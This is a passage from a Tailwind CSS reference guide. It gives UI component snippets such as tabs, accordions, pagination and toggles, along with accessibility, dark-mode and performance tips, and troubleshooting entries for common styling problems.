  <div class="h-4 bg-gray-200 rounded w-3/4"></div>
  <div class="h-4 bg-gray-200 rounded"></div>
  <div class="h-4 bg-gray-200 rounded w-5/6"></div>
</div>

<!-- Skeleton card -->
<div class="animate-pulse">
  <div class="bg-gray-200 rounded-lg h-48"></div>
  <div class="mt-4 space-y-3">
    <div class="h-4 bg-gray-200 rounded w-3/4"></div>
    <div class="h-4 bg-gray-200 rounded w-1/2"></div>
  </div>
</div>
```

### Tabs
```html
<!-- Tab Navigation -->
<div class="border-b border-gray-200">
  <nav class="-mb-px flex space-x-8" aria-label="Tabs">
    <button
      class="border-primary-500 text-primary-600 border-b-2 py-4 px-1 text-sm font-medium"
      aria-current="page"
    >
      Active Tab
    </button>
    <button
      class="border-transparent text-gray-500 hover:border-gray-300 hover:text-gray-700 border-b-2 py-4 px-1 text-sm font-medium"
    >
      Inactive Tab
    </button>
  </nav>
</div>

<!-- Pill Tabs -->
<div class="flex space-x-1 bg-gray-100 p-1 rounded-lg">
  <button class="flex-1 bg-white text-gray-900 rounded-md py-2 text-sm font-medium shadow">
    Active
  </button>
  <button class="flex-1 text-gray-500 hover:text-gray-700 rounded-md py-2 text-sm font-medium">
    Inactive
  </button>
</div>
```

### Accordion/Disclosure
```html
<!-- Simple Accordion -->
<div class="divide-y divide-gray-200 border rounded-lg">
  <details class="group" open>
    <summary class="flex items-center justify-between cursor-pointer p-4 hover:bg-gray-50">
      <span class="font-medium">Section Title</span>
      <svg class="w-5 h-5 text-gray-500 transition-transform group-open:rotate-180" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
      </svg>
    </summary>
    <div class="p-4 pt-0 text-gray-600">
      Accordion content goes here...
    </div>
  </details>
  <details class="group">
    <summary class="flex items-center justify-between cursor-pointer p-4 hover:bg-gray-50">
      <span class="font-medium">Another Section</span>
      <svg class="w-5 h-5 text-gray-500 transition-transform group-open:rotate-180" fill="none" viewBox="0 0 24 24" stroke="currentColor">
        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M19 9l-7 7-7-7" />
      </svg>
    </summary>
    <div class="p-4 pt-0 text-gray-600">
      More content...
    </div>
  </details>
</div>
```

### Breadcrumbs
```html
<nav class="flex" aria-label="Breadcrumb">
  <ol class="flex items-center space-x-2">
    <li>
      <a href="/" class="text-gray-400 hover:text-gray-500">
        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
          <path d="M10.707 2.293a1 1 0 00-1.414 0l-7 7a1 1 0 001.414 1.414L4 10.414V17a1 1 0 001 1h2a1 1 0 001-1v-2a1 1 0 011-1h2a1 1 0 011 1v2a1 1 0 001 1h2a1 1 0 001-1v-6.586l.293.293a1 1 0 001.414-1.414l-7-7z" />
        </svg>
        <span class="sr-only">Home</span>
      </a>
    </li>
    <li class="flex items-center">
      <svg class="w-5 h-5 text-gray-300" fill="currentColor" viewBox="0 0 20 20">
        <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
      </svg>
      <a href="#" class="ml-2 text-sm font-medium text-gray-500 hover:text-gray-700">Projects</a>
    </li>
    <li class="flex items-center">
      <svg class="w-5 h-5 text-gray-300" fill="currentColor" viewBox="0 0 20 20">
        <path fill-rule="evenodd" d="M7.293 14.707a1 1 0 010-1.414L10.586 10 7.293 6.707a1 1 0 011.414-1.414l4 4a1 1 0 010 1.414l-4 4a1 1 0 01-1.414 0z" clip-rule="evenodd" />
      </svg>
      <span class="ml-2 text-sm font-medium text-gray-700" aria-current="page">Current Page</span>
    </li>
  </ol>
</nav>
```

### File Upload
```html
<!-- Drag and Drop Zone -->
<div class="flex justify-center px-6 pt-5 pb-6 border-2 border-gray-300 border-dashed rounded-lg hover:border-primary-500 transition-colors">
  <div class="space-y-1 text-center">
    <svg class="mx-auto h-12 w-12 text-gray-400" stroke="currentColor" fill="none" viewBox="0 0 48 48">
      <path d="M28 8H12a4 4 0 00-4 4v20m32-12v8m0 0v8a4 4 0 01-4 4H12a4 4 0 01-4-4v-4m32-4l-3.172-3.172a4 4 0 00-5.656 0L28 28M8 32l9.172-9.172a4 4 0 015.656 0L28 28m0 0l4 4m4-24h8m-4-4v8m-12 4h.02" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" />
    </svg>
    <div class="flex text-sm text-gray-600">
      <label class="relative cursor-pointer rounded-md font-medium text-primary-600 hover:text-primary-500">
        <span>Upload a file</span>
        <input type="file" class="sr-only" />
      </label>
      <p class="pl-1">or drag and drop</p>
    </div>
    <p class="text-xs text-gray-500">PNG, JPG, PDF up to 10MB</p>
  </div>
</div>

<!-- File List Item -->
<div class="flex items-center justify-between p-3 bg-gray-50 rounded-lg">
  <div class="flex items-center gap-3 min-w-0">
    <svg class="w-8 h-8 text-gray-400 flex-shrink-0" fill="currentColor" viewBox="0 0 20 20">
      <path fill-rule="evenodd" d="M4 4a2 2 0 012-2h4.586A2 2 0 0112 2.586L15.414 6A2 2 0 0116 7.414V16a2 2 0 01-2 2H6a2 2 0 01-2-2V4z" clip-rule="evenodd" />
    </svg>
    <div class="min-w-0">
      <p class="text-sm font-medium text-gray-900 truncate">document.pdf</p>
      <p class="text-xs text-gray-500">2.4 MB</p>
    </div>
  </div>
  <button class="p-1 text-gray-400 hover:text-red-500 rounded">
    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
      <path fill-rule="evenodd" d="M4.293 4.293a1 1 0 011.414 0L10 8.586l4.293-4.293a1 1 0 111.414 1.414L11.414 10l4.293 4.293a1 1 0 01-1.414 1.414L10 11.414l-4.293 4.293a1 1 0 01-1.414-1.414L8.586 10 4.293 5.707a1 1 0 010-1.414z" clip-rule="evenodd" />
    </svg>
  </button>
</div>
```

### Avatar Group
```html
<!-- Avatar Stack -->
<div class="flex -space-x-2">
  <img class="w-8 h-8 rounded-full ring-2 ring-white" src="..." alt="" />
  <img class="w-8 h-8 rounded-full ring-2 ring-white" src="..." alt="" />
  <img class="w-8 h-8 rounded-full ring-2 ring-white" src="..." alt="" />
  <span class="flex items-center justify-center w-8 h-8 text-xs font-medium text-gray-600 bg-gray-100 rounded-full ring-2 ring-white">
    +5
  </span>
</div>

<!-- Avatar with Status -->
<div class="relative inline-block">
  <img class="w-10 h-10 rounded-full" src="..." alt="" />
  <span class="absolute bottom-0 right-0 block w-2.5 h-2.5 bg-green-400 rounded-full ring-2 ring-white"></span>
</div>

<!-- Avatar with Initials -->
<span class="inline-flex items-center justify-center w-10 h-10 rounded-full bg-primary-500">
  <span class="text-sm font-medium text-white">JD</span>
</span>
```

### Progress Indicators
```html
<!-- Progress Bar -->
<div class="w-full bg-gray-200 rounded-full h-2">
  <div class="bg-primary-500 h-2 rounded-full transition-all duration-300" style="width: 65%"></div>
</div>

<!-- Progress Bar with Label -->
<div>
  <div class="flex justify-between text-sm mb-1">
    <span class="font-medium text-gray-700">Progress</span>
    <span class="text-gray-500">65%</span>
  </div>
  <div class="w-full bg-gray-200 rounded-full h-2">
    <div class="bg-primary-500 h-2 rounded-full" style="width: 65%"></div>
  </div>
</div>

<!-- Step Progress -->
<div class="flex items-center">
  <div class="flex items-center text-primary-600 relative">
    <div class="w-8 h-8 rounded-full bg-primary-600 flex items-center justify-center text-white text-sm font-bold">
      1
    </div>
    <div class="absolute top-0 -ml-10 text-center mt-10 w-28 text-xs font-medium text-primary-600">
      Step 1
    </div>
  </div>
  <div class="flex-1 h-0.5 bg-primary-600"></div>
  <div class="flex items-center text-primary-600 relative">
    <div class="w-8 h-8 rounded-full bg-primary-600 flex items-center justify-center text-white text-sm font-bold">
      2
    </div>
    <div class="absolute top-0 -ml-10 text-center mt-10 w-28 text-xs font-medium text-primary-600">
      Step 2
    </div>
  </div>
  <div class="flex-1 h-0.5 bg-gray-300"></div>
  <div class="flex items-center text-gray-400 relative">
    <div class="w-8 h-8 rounded-full border-2 border-gray-300 flex items-center justify-center text-sm font-bold">
      3
    </div>
    <div class="absolute top-0 -ml-10 text-center mt-10 w-28 text-xs font-medium text-gray-400">
      Step 3
    </div>
  </div>
</div>
```

### Toggle Switch
```html
<!-- Toggle Component -->
<button
  type="button"
  class="relative inline-flex h-6 w-11 flex-shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none focus:ring-2 focus:ring-primary-500 focus:ring-offset-2 bg-primary-600"
  role="switch"
  aria-checked="true"
>
  <span class="sr-only">Toggle setting</span>
  <span
    class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out translate-x-5"
  ></span>
</button>

<!-- Off state version -->
<button
  type="button"
  class="relative inline-flex h-6 w-11 flex-shrink-0 cursor-pointer rounded-full border-2 border-transparent transition-colors duration-200 ease-in-out focus:outline-none focus:ring-2 focus:ring-primary-500 focus:ring-offset-2 bg-gray-200"
  role="switch"
  aria-checked="false"
>
  <span class="sr-only">Toggle setting</span>
  <span
    class="pointer-events-none inline-block h-5 w-5 transform rounded-full bg-white shadow ring-0 transition duration-200 ease-in-out translate-x-0"
  ></span>
</button>

<!-- Toggle with Label -->
<div class="flex items-center justify-between">
  <span class="text-sm font-medium text-gray-900">Enable notifications</span>
  <!-- Toggle button here -->
</div>
```

### Tooltip
```html
<!-- Simple Tooltip -->
<div class="relative inline-block group">
  <button class="p-2 text-gray-500 hover:text-gray-700">
    <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 20 20">
      <path fill-rule="evenodd" d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7-4a1 1 0 11-2 0 1 1 0 012 0zM9 9a1 1 0 000 2v3a1 1 0 001 1h1a1 1 0 100-2v-3a1 1 0 00-1-1H9z" clip-rule="evenodd" />
    </svg>
  </button>
  <div class="absolute bottom-full left-1/2 -translate-x-1/2 mb-2 px-3 py-1.5 bg-gray-900 text-white text-xs rounded-lg whitespace-nowrap opacity-0 invisible group-hover:opacity-100 group-hover:visible transition-all duration-200">
    Tooltip text here
    <div class="absolute top-full left-1/2 -translate-x-1/2 -mt-1 border-4 border-transparent border-t-gray-900"></div>
  </div>
</div>
```

### Pagination
```html
<nav class="flex items-center justify-between">
  <div class="flex-1 flex justify-between sm:hidden">
    <a href="#" class="px-4 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md hover:bg-gray-50">
      Previous
    </a>
    <a href="#" class="px-4 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md hover:bg-gray-50">
      Next
    </a>
  </div>
  <div class="hidden sm:flex sm:flex-1 sm:items-center sm:justify-between">
    <p class="text-sm text-gray-700">
      Showing <span class="font-medium">1</span> to <span class="font-medium">10</span> of
      <span class="font-medium">97</span> results
    </p>
    <div class="flex gap-1">
      <a href="#" class="px-3 py-2 text-sm font-medium text-gray-500 bg-white border border-gray-300 rounded-md hover:bg-gray-50">
        Previous
      </a>
      <a href="#" class="px-3 py-2 text-sm font-medium text-white bg-primary-600 border border-primary-600 rounded-md">
        1
      </a>
      <a href="#" class="px-3 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md hover:bg-gray-50">
        2
      </a>
      <a href="#" class="px-3 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md hover:bg-gray-50">
        3
      </a>
      <span class="px-3 py-2 text-gray-500">...</span>
      <a href="#" class="px-3 py-2 text-sm font-medium text-gray-700 bg-white border border-gray-300 rounded-md hover:bg-gray-50">
        10
      </a>
      <a href="#" class="px-3 py-2 text-sm font-medium text-gray-500 bg-white border border-gray-300 rounded-md hover:bg-gray-50">
        Next
      </a>
    </div>
  </div>
</nav>
```

### Empty State
```html
<div class="flex flex-col items-center justify-center py-12 px-4 text-center">
  <svg class="w-16 h-16 text-gray-300 mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="1.5" d="M9 13h6m-3-3v6m-9 1V7a2 2 0 012-2h6l2 2h6a2 2 0 012 2v8a2 2 0 01-2 2H5a2 2 0 01-2-2z" />
  </svg>
  <h3 class="text-lg font-medium text-gray-900 mb-1">No projects yet</h3>
  <p class="text-sm text-gray-500 mb-6 max-w-sm">
    Get started by creating your first project. Projects help you organize your work.
  </p>
  <button class="inline-flex items-center gap-2 px-4 py-2 text-sm font-medium text-white bg-primary-600 rounded-lg hover:bg-primary-700">
    <svg class="w-5 h-5" fill="none" stroke="currentColor" viewBox="0 0 24 24">
      <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 6v6m0 0v6m0-6h6m-6 0H6" />
    </svg>
    New Project
  </button>
</div>
```

### Stats/Metrics
```html
<!-- Stats Grid -->
<div class="grid grid-cols-1 gap-4 sm:grid-cols-2 lg:grid-cols-4">
  <div class="bg-white p-6 rounded-lg shadow-sm border border-gray-100">
    <dt class="text-sm font-medium text-gray-500 truncate">Total Revenue</dt>
    <dd class="mt-1 text-3xl font-semibold text-gray-900">€45,231.89</dd>
    <dd class="mt-2 flex items-center text-sm">
      <span class="text-green-600 font-medium flex items-center">
        <svg class="w-4 h-4 mr-1" fill="currentColor" viewBox="0 0 20 20">
          <path fill-rule="evenodd" d="M5.293 9.707a1 1 0 010-1.414l4-4a1 1 0 011.414 0l4 4a1 1 0 01-1.414 1.414L11 7.414V15a1 1 0 11-2 0V7.414L6.707 9.707a1 1 0 01-1.414 0z" clip-rule="evenodd" />
        </svg>
        12%
      </span>
      <span class="text-gray-500 ml-2">from last month</span>
    </dd>
  </div>
  <!-- More stat cards... -->
</div>
```

## Accessibility

### Focus Management
```html
<!-- Visible focus ring -->
<button class="focus:outline-none focus-visible:ring-2 focus-visible:ring-primary-500 focus-visible:ring-offset-2">
  Button
</button>

<!-- Skip link -->
<a href="#main" class="sr-only focus:not-sr-only focus:absolute focus:z-50 focus:p-4 focus:bg-white">
  Skip to main content
</a>
```

### Screen Reader Only
```html
<!-- Hidden visually but accessible to screen readers -->
<span class="sr-only">Loading...</span>

<!-- Icon button with label -->
<button class="p-2 rounded-lg hover:bg-gray-100">
  <svg class="w-5 h-5" aria-hidden="true">...</svg>
  <span class="sr-only">Close menu</span>
</button>
```

### Color Contrast
```html
<!-- Ensure sufficient contrast -->
<!-- Good: text-gray-900 on bg-white -->
<!-- Good: text-white on bg-primary-600 -->
<!-- Bad: text-gray-400 on bg-gray-100 -->

<!-- Use opacity carefully -->
<p class="text-gray-600">Good readable text</p>
<p class="text-gray-900/60">May have contrast issues</p>
```

## Dark Mode

### Implementation
```html
<!-- Toggle dark mode with class -->
<html class="dark">
  <body class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white">
    <div class="bg-gray-100 dark:bg-gray-800">
      <p class="text-gray-600 dark:text-gray-400">Content</p>
    </div>
  </body>
</html>
```

### Dark Mode Toggle
```javascript
// JavaScript toggle
function toggleDarkMode() {
  document.documentElement.classList.toggle('dark');
  localStorage.theme = document.documentElement.classList.contains('dark')
    ? 'dark'
    : 'light';
}

// On page load
if (localStorage.theme === 'dark' ||
    (!('theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
  document.documentElement.classList.add('dark');
} else {
  document.documentElement.classList.remove('dark');
}
```

## Performance Best Practices

### Reduce Bundle Size
```javascript
// tailwind.config.js
module.exports = {
  content: [
    './resources/**/*.{js,vue,blade.php}',
    // Only include files that contain Tailwind classes
  ],
  // Safelist classes that might be generated dynamically
  safelist: [
    'bg-red-500',
    'bg-green-500',
    'bg-blue-500',
    {
      pattern: /bg-(red|green|blue)-(100|500)/,
    },
  ],
};
```

### Avoid Expensive CSS
```html
<!-- Avoid animating layout properties -->
<!-- Bad: animate width/height -->
<div class="hover:w-[200px]">...</div>

<!-- Good: animate transform -->
<div class="hover:scale-110">...</div>

<!-- Use GPU-accelerated properties -->
<div class="transform-gpu hover:scale-105">...</div>

<!-- Minimize repaints -->
<div class="will-change-transform hover:scale-110">...</div>
```

### Responsive Images
```html
<img
  src="image-800.jpg"
  srcset="image-400.jpg 400w, image-800.jpg 800w, image-1200.jpg 1200w"
  sizes="(max-width: 640px) 100vw, (max-width: 1024px) 50vw, 33vw"
  class="w-full h-auto object-cover"
  loading="lazy"
  decoding="async"
  alt="Description"
/>
```

## Debugging Tips

### Outline All Elements
```css
/* Add to your CSS for debugging */
* {
  outline: 1px solid red !important;
}

/* Or in Tailwind */
<div class="[&_*]:outline [&_*]:outline-red-500">...</div>
```

### Debug Breakpoints
```html
<!-- Show current breakpoint -->
<div class="fixed bottom-4 right-4 p-2 bg-black text-white text-xs rounded z-50">
  <span class="sm:hidden">XS</span>
  <span class="hidden sm:inline md:hidden">SM</span>
  <span class="hidden md:inline lg:hidden">MD</span>
  <span class="hidden lg:inline xl:hidden">LG</span>
  <span class="hidden xl:inline 2xl:hidden">XL</span>
  <span class="hidden 2xl:inline">2XL</span>
</div>
```

### Tailwind CSS IntelliSense
```json
// VSCode settings.json
{
  "tailwindCSS.includeLanguages": {
    "vue": "html",
    "blade": "html"
  },
  "tailwindCSS.experimental.classRegex": [
    ["class\\s*:\\s*['\"]([^'\"]*)['\"]", "([^'\"\\s]*)"]
  ]
}
```

## Troubleshooting

### Problem 1: Tailwind Classes Not Applied

**Symptoms:**
- Classes appear in HTML but styles don't render
- Some Tailwind classes work, others don't
- Styles work in dev but not production

**Cause:**
- Content paths not configured correctly
- Classes generated dynamically (not detected by JIT)
- PurgeCSS removing "unused" classes
- CSS file not imported

**Solution:**
```javascript
// tailwind.config.js
module.exports = {
  content: [
    // ✅ Include all files that use Tailwind classes
    './resources/**/*.blade.php',
    './resources/**/*.js',
    './resources/**/*.vue',
    // Don't forget these!
    './app/View/Components/**/*.php',
    './vendor/laravel/framework/src/Illuminate/Pagination/resources/views/*.blade.php',
  ],
  // Safelist classes that are dynamically generated
  safelist: [
    'bg-red-500',
    'bg-green-500',
    'bg-blue-500',
    {
      pattern: /bg-(red|green|blue|yellow)-(100|500|700)/,
      variants: ['hover', 'focus'],
    },
    {
      pattern: /text-(xs|sm|base|lg|xl)/,
    },
  ],
}
```

```vue
<!-- ❌ BAD - Dynamic class not detected -->
<div :class="`bg-${color}-500`">...</div>

<!-- ✅ GOOD - Full class names -->
<div :class="{
  'bg-red-500': color === 'red',
  'bg-green-500': color === 'green',
  'bg-blue-500': color === 'blue'
}">...</div>
```

**Prevention:**
- Always use complete class names in code
- Add dynamic classes to safelist
- Verify content paths include all template files

### Problem 2: Z-Index Not Working

**Symptoms:**
- Element with higher z-index appears behind
- Modal doesn't overlay content
- Dropdown hidden behind other elements

**Cause:**
- Missing `position` property
- Stacking context issues
- Parent creating new stacking context

**Solution:**
```html
<!-- ❌ BAD - z-index without position -->
<div class="z-50">Won't work!</div>

<!-- ✅ GOOD - z-index with position -->
<div class="relative z-50">Works!</div>
<div class="fixed z-50">Works!</div>
<div class="absolute z-50">Works!</div>

<!-- For modals, ensure proper stacking context -->
<div class="fixed inset-0 z-40 bg-black/50"><!-- Backdrop --></div>
<div class="fixed inset-0 z-50 flex items-center justify-center">
  <div class="bg-white rounded-lg"><!-- Modal content --></div>
</div>
```

```css
/* Check for stacking context creators */
.problematic-parent {
  /* These create new stacking context: */
  transform: translateX(0); /* Any transform */
  opacity: 0.99;            /* opacity < 1 */
  filter: blur(0);          /* Any filter */
  will-change: transform;   /* will-change */
  isolation: isolate;       /* isolation */
}
```

**Prevention:**
- Always pair z-index with position
- Use Tailwind's z-index scale consistently
- Be aware of stacking context creators

### Problem 3: Flexbox Items Not Sizing Correctly

**Symptoms:**
- Items overflow container
- Items don't shrink as expected
- Content causes uneven widths

**Cause:**
- Missing `min-width: 0` on flex items
- Implicit min-width from content
- Missing `flex-shrink` or `flex-grow`

**Solution:**
```html
<!-- ❌ BAD - Text overflows -->
<div class="flex">
  <div class="w-48 flex-shrink-0">Sidebar</div>
  <div>Long text that should truncate but overflows instead...</div>
</div>

<!-- ✅ GOOD - min-w-0 allows shrinking -->
<div class="flex">
  <div class="w-48 flex-shrink-0">Sidebar</div>
  <div class="min-w-0 truncate">Long text that properly truncates...</div>
</div>

<!-- For equal width items -->
<div class="flex">
  <div class="flex-1 min-w-0">Item 1</div>
  <div class="flex-1 min-w-0">Item 2</div>
  <div class="flex-1 min-w-0">Item 3</div>
</div>
```

**Prevention:**
- Add `min-w-0` to flex items that should shrink
- Use `flex-1` for equal distribution
- Test with long content

### Problem 4: Grid Items Not Aligning

**Symptoms:**
- Grid items have inconsistent heights
- Items don't fill grid cell
- Unexpected gaps or overlaps

**Cause:**
- Missing alignment properties
- Implicit grid sizing
- Content affecting cell size

**Solution:**
```html
<!-- ❌ BAD - Inconsistent card heights -->
<div class="grid grid-cols-3 gap-4">
  <div class="p-4">Short card</div>
  <div class="p-4">Card with much more content that makes it taller</div>
  <div class="p-4">Short card</div>
</div>

<!-- ✅ GOOD - Equal height cards with aligned content -->
<div class="grid grid-cols-3 gap-4">
  <div class="flex flex-col p-4">
    <h3>Title</h3>
    <p class="flex-1">Content</p>
    <button class="mt-auto">Action</button>
  </div>
  <!-- ... -->
</div>

<!-- For centering grid items -->
<div class="grid place-items-center min-h-screen">
  <div>Perfectly centered</div>
</div>
```

**Prevention:**
- Use `place-items-center` for centering
- Combine grid with flexbox for complex layouts
- Test with varying content lengths

### Problem 5: Transitions Not Smooth

**Symptoms:**
- Animation appears janky
- Elements "jump" during transition
- Performance issues during animation

**Cause:**
- Animating expensive properties (width, height, top, left)
- Layout thrashing
- Missing `will-change` for complex animations

**Solution:**
```html
<!-- ❌ BAD - Animating layout properties -->
<div class="transition-all hover:w-[200px] hover:h-[200px]">
  Janky animation
</div>

<!-- ✅ GOOD - Animating transform and opacity -->
<div class="transition-transform hover:scale-110">
  Smooth animation
</div>

<!-- For slide animations -->
<div class="transform transition-transform translate-x-0 hover:translate-x-4">
  Slides smoothly
</div>

<!-- For complex animations, use will-change sparingly -->
<div class="will-change-transform transition-transform hover:scale-105">
  GPU accelerated
</div>
```

```css
/* Properties that cause repaints (avoid animating) */
/* width, height, top, left, right, bottom, margin, padding, border-width */

/* Properties that are GPU-accelerated (prefer these) */
/* transform, opacity */
```

**Prevention:**
- Only animate `transform` and `opacity` when possible
- Use `scale`, `translate`, `rotate` instead of `width`, `height`
- Apply `will-change` only where needed (remove after animation)

### Problem 6: Overflow Issues

**Symptoms:**
- Horizontal scrollbar appears unexpectedly
- Content spills outside container
- Mobile viewport wider than screen

**Cause:**
- Fixed-width elements exceeding viewport
- Negative margins creating overflow
- 100vw including scrollbar width

**Solution:**
```html
<!-- ❌ BAD - 100vw causes horizontal scroll when scrollbar present -->
<div class="w-screen">Full width with scroll issue</div>

<!-- ✅ GOOD - Use percentage or container -->
<div class="w-full">Properly contained</div>
<div class="container mx-auto">Properly contained</div>

<!-- For full-bleed sections within container -->
<div class="container mx-auto px-4">
  <div class="-mx-4 sm:-mx-6 lg:-mx-8">
    <div class="px-4 sm:px-6 lg:px-8">
      Full bleed content that doesn't overflow
    </div>
  </div>
</div>

<!-- Debug overflow issues -->
<body class="overflow-x-hidden">
  <!-- Prevents horizontal scroll while you debug -->
</body>
```

**Prevention:**
- Avoid `w-screen` and `100vw`
- Use `overflow-hidden` on parent containers
- Test on mobile devices with and without notch

### Problem 7: Dark Mode Styles Not Applying

**Symptoms:**
- Dark mode classes ignored
- Styles don't switch on mode change
- Some components don't respect dark mode

**Cause:**
- Dark mode strategy not configured
- Missing `dark:` variant
- Class-based mode without toggling class

**Solution:**
```javascript
// tailwind.config.js
module.exports = {
  darkMode: 'class', // or 'media' for system preference
  // ...
}
```

```javascript
// Toggle dark mode
function toggleDarkMode() {
  document.documentElement.classList.toggle('dark');
  localStorage.theme = document.documentElement.classList.contains('dark')
    ? 'dark'
    : 'light';
}

// Initialize on page load
if (localStorage.theme === 'dark' ||
    (!('theme' in localStorage) &&
     window.matchMedia('(prefers-color-scheme: dark)').matches)) {
  document.documentElement.classList.add('dark');
}
```

```html
<!-- Ensure dark: variants are applied -->
<div class="bg-white dark:bg-gray-900 text-gray-900 dark:text-white">
  <p class="text-gray-600 dark:text-gray-400">Properly themed content</p>
</div>
```

**Prevention:**
- Choose darkMode strategy upfront
- Add dark: variants to all color classes
- Test theme switching early

### Problem 8: Forms Styled Inconsistently Across Browsers

**Symptoms:**
- Inputs look different in Safari vs Chrome
- Checkboxes/radios have default browser styling
- Focus rings inconsistent

**Cause:**
- Browser default styles
- Missing `@tailwindcss/forms` plugin
- Vendor-specific styles not reset

**Solution:**
```bash
npm install @tailwindcss/forms
```

```javascript
// tailwind.config.js
module.exports = {
  plugins: [
    require('@tailwindcss/forms'),
  ],
}
```

```html
<!-- Consistent form styling -->
<input
  type="text"
  class="block w-full rounded-md border-gray-300 shadow-sm
         focus:border-primary-500 focus:ring-primary-500
         dark:bg-gray-800 dark:border-gray-700"
/>

<input
  type="checkbox"
  class="rounded text-primary-600 focus:ring-primary-500
         dark:bg-gray-800 dark:border-gray-700"
/>
```

**Prevention:**
- Use `@tailwindcss/forms` plugin
- Test forms across browsers
- Define consistent focus states

### Problem 9: Sticky Element Not Working

**Symptoms:**
- Element with `sticky` doesn't stick
- Works in some browsers, not others
- Sticky only works partially

**Cause:**
- Missing `top`/`bottom`/`left`/`right` value
- Parent has `overflow: hidden/auto/scroll`
- Parent height not defined
- Browser support issues

**Solution:**
```html
<!-- ❌ BAD - No top value -->
<div class="sticky">Won't stick!</div>

<!-- ✅ GOOD - Has top value -->
<div class="sticky top-0">Sticks to top!</div>

<!-- Check parent doesn't have overflow -->
<!-- ❌ BAD -->
<div class="overflow-hidden">
  <div class="sticky top-0">Won't work!</div>
</div>

<!-- ✅ GOOD - No overflow on parent -->
<div class="overflow-visible">
  <div class="sticky top-0">Works!</div>
</div>

<!-- For headers that should stick below nav -->
<header class="sticky top-16 z-40">
  <!-- Sticks 4rem from top (below a h-16 navbar) -->
</header>
```

**Prevention:**
- Always add `top-*` with `sticky`
- Check parent elements for overflow
- Ensure parent has defined height or content

### Problem 10: Text Not Readable on Background Image

**Symptoms:**
- Text hard to read over image
- Text invisible in some areas
- Inconsistent legibility

**Cause:**
- No overlay or contrast treatment
- Image colors vary too much
- Missing text shadow

**Solution:**
```html
<!-- ✅ GOOD - Overlay approach -->
<div class="relative">
  <img src="..." class="absolute inset-0 w-full h-full object-cover" />
  <div class="absolute inset-0 bg-black/50"></div>
  <div class="relative z-10 text-white">
    Readable text on any image
  </div>
</div>

<!-- ✅ GOOD - Gradient overlay for bottom text -->
<div class="relative">
  <img src="..." class="w-full h-64 object-cover" />
  <div class="absolute inset-x-0 bottom-0 bg-gradient-to-t from-black/80 to-transparent p-4">
    <h3 class="text-white font-bold">Title</h3>
  </div>
</div>

<!-- ✅ GOOD - Text shadow -->
<h1 class="text-white drop-shadow-lg [text-shadow:_0_2px_4px_rgba(0,0,0,0.8)]">
  Readable Title
</h1>

<!-- ✅ GOOD - Backdrop blur -->
<div class="backdrop-blur-sm bg-white/30 p-4 rounded-lg">
  <p class="text-gray-900">Readable on any background</p>
</div>
```

**Prevention:**
- Always add contrast overlay on images
- Use gradient overlays for partial coverage
- Test with various images

### Problem 11: Animation Jank on Mobile

**Symptoms:**
- Smooth on desktop, janky on mobile
- Animations stutter
- Low frame rate

**Cause:**
- Animating expensive properties
- Too many simultaneous animations
- Missing hardware acceleration

**Solution:**
```html
<!-- ❌ BAD - Animating layout properties -->
<div class="transition-all hover:w-64 hover:mt-4">
  Causes jank
</div>

<!-- ✅ GOOD - Animating transform/opacity only -->
<div class="transition-transform hover:scale-110">
  Smooth
</div>

<!-- ✅ GOOD - Force GPU acceleration -->
<div class="transform-gpu hover:scale-105 hover:-translate-y-1">
  Hardware accelerated
</div>

<!-- ✅ GOOD - Reduce animation on mobile -->
<div class="transition-transform duration-300 md:duration-200
            motion-reduce:transition-none
            motion-reduce:hover:transform-none">
  Respects user preferences
</div>

<!-- Limit simultaneous animations -->
<style>
@media (prefers-reduced-motion: no-preference) {
  .stagger-animation > * {
    animation: fadeIn 0.3s ease backwards;
  }
  .stagger-animation > *:nth-child(1) { animation-delay: 0ms; }
  .stagger-animation > *:nth-child(2) { animation-delay: 50ms; }
  .stagger-animation > *:nth-child(3) { animation-delay: 100ms; }
}
</style>
```

**Prevention:**
- Only animate `transform` and `opacity`
- Use `transform-gpu` for complex animations
- Always support `prefers-reduced-motion`

### Problem 12: Content Jumps on Image Load

**Symptoms:**
- Layout shifts when images load
- Page content jumps around
- Poor Core Web Vitals (CLS)

**Cause:**
- No reserved space for images
- Missing width/height attributes
- Dynamic content without placeholders

**Solution:**
```html
<!-- ❌ BAD - No dimensions -->
<img src="..." class="w-full" />

<!-- ✅ GOOD - Aspect ratio reserve space -->
<div class="aspect-video bg-gray-200">
  <img src="..." class="w-full h-full object-cover" loading="lazy" />
</div>

<!-- ✅ GOOD - With skeleton placeholder -->
<div class="aspect-video">
  <img
    src="..."
    class="w-full h-full object-cover opacity-0 transition-opacity duration-300"
    onload="this.classList.remove('opacity-0')"
  />
  <div class="absolute inset-0 bg-gray-200 animate-pulse -z-10"></div>
</div>

<!-- ✅ GOOD - Explicit dimensions -->
<img
  src="..."
  width="800"
  height="600"
  class="w-full h-auto"
  loading="lazy"
  decoding="async"
/>
```

**Prevention:**
- Always use `aspect-ratio` or explicit dimensions
- Add skeleton placeholders
- Use native `loading="lazy"`

### Problem 13: Print Styles Not Working

**Symptoms:**
- Page looks wrong when printed
- Colors don't print
- Navigation appears in print

**Cause:**
- No print-specific styles
- Background colors not printed
- Print margins incorrect

**Solution:**
```html
